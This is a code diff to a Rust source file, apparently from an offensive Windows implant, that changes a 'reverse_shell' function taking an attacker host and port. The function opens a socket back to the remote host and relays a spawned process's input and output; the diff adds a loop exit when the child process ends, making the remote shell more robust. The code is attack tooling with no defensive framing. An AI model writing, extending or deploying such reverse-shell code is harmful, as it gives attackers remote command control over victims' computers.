@@ -6,7 +6,7 @@ use crate::{
     get_instance,
     libs::{
         k32::{ProcessInformation, SecurityAttributes, StartupInfoW},
-        ntdef::IoStatusBlock,
+        ntdef::{IoStatusBlock, ProcessBasicInformation},
         ntpsapi::nt_create_named_pipe_file,
         winsock::{connect_socket, create_socket, init_winsock, FD_SET, FIONBIO, TIMEVAL},
     },
@@ -141,6 +141,27 @@ pub fn reverse_shell(lhost: &str, lport: u16, process: &str) -> bool {
 
         // Main loop to handle communication between the remote server and the local process
         loop {
+            // Check if the child process is still active
+            let mut process_basic_info: ProcessBasicInformation = core::mem::zeroed();
+            let mut return_length: u32 = 0;
+
+            let status = get_instance()
+                .unwrap()
+                .ntdll
+                .nt_query_information_process
+                .run(
+                    process_info.h_process,
+                    0, // ProcessBasicInformation
+                    &mut process_basic_info as *mut _ as *mut c_void,
+                    core::mem::size_of::<ProcessBasicInformation>() as u32,
+                    &mut return_length,
+                );
+
+            // Break the loop if the child process has exited
+            if status != 0 || process_basic_info.exit_status != 259 {
+                break;
+            }
+
             // Prepare to use `select` to monitor socket activity
             let mut fd_array = [0usize; 64];
             fd_array[0] = sock;
